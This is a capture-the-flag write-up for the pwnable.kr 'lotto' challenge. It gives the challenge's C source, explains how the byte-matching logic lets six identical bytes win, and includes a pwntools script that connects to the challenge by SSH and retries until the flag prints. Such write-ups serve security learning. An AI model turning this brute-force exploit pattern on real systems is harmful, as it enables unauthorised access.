Some lotto!

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
unsigned char submit[6];

void play(){
	
	int i;
	printf("Submit your 6 lotto bytes : ");
	fflush(stdout);

	int r;
	r = read(0, submit, 6);

	printf("Lotto Start!\n");
	//sleep(1);

	// generate lotto numbers
	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1){
		printf("error. tell admin\n");
		exit(-1);
	}
	unsigned char lotto[6];
	if(read(fd, lotto, 6) != 6){
		printf("error2. tell admin\n");
		exit(-1);
	}
	for(i=0; i<6; i++){
		lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
	}
	close(fd);
	
	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}

}

void help(){
	printf("- nLotto Rule -\n");
	printf("nlotto is consisted with 6 random natural numbers less than 46\n");
	printf("your goal is to match lotto numbers as many as you can\n");
	printf("if you win lottery for *1st place*, you will get reward\n");
	printf("for more details, follow the link below\n");
	printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
	printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

	// menu
	unsigned int menu;

	while(1){

		printf("- Select Menu -\n");
		printf("1. Play Lotto\n");
		printf("2. Help\n");
		printf("3. Exit\n");

		scanf("%d", &menu);

		switch(menu){
			case 1:
				play();
				break;
			case 2:
				help();
				break;
			case 3:
				printf("bye\n");
				return 0;
			default:
				printf("invalid menu\n");
				break;
		}
	}
	return 0;
}
```

Let's inspect the `play` function more closely.

- Reads 6 bytes from fd #0 (stdtin) and saves it in `submit`
- Reads 6 bytes from `/dev/urandom` and saves it in `lotto`
- Compare each character from `submit` to each character in `lotto`, if a match occurs, increment the counter by 1
- If the counter equals to 6 exactly, `cat` our flag, elsewise just print and function ends.

The solution here just relies on the fact that before calculating the lotto score, the game perfoms a modulo on the `lotto` array and just minimizes the range of the characters to be [1, 45].
If we give the game a string of the same characters we have a chance of 6/45 of succeeding, which is not likely but who said we cannot just try <b>A LOT</b> of times? At the end we only need to succeed once, but may fail infinite times.

I wrote a script for this:
```python
import pwn

GUESS = b"\x01\x01\x01\x01\x01\x01"

# SSH into the machine
r = pwn.ssh("lotto", "pwnable.kr", 2222, "guest")
p = r.process("./lotto")
while True:
    # Receive output and send '1' to play game
    p.recv()
    p.sendline(b"1")

    # Receive output and send our guess
    p.recv()
    p.sendline(GUESS)

    # We don't care about the "Lotto Start!\n" printf
    p.recvline()

    # Get the output, it should either be "bad luck" or our flag
    trial_ret = p.recvline()
    if b"bad luck" not in trial_ret:
        print(trial_ret.rstrip())
        break

p.close()
r.close()
```
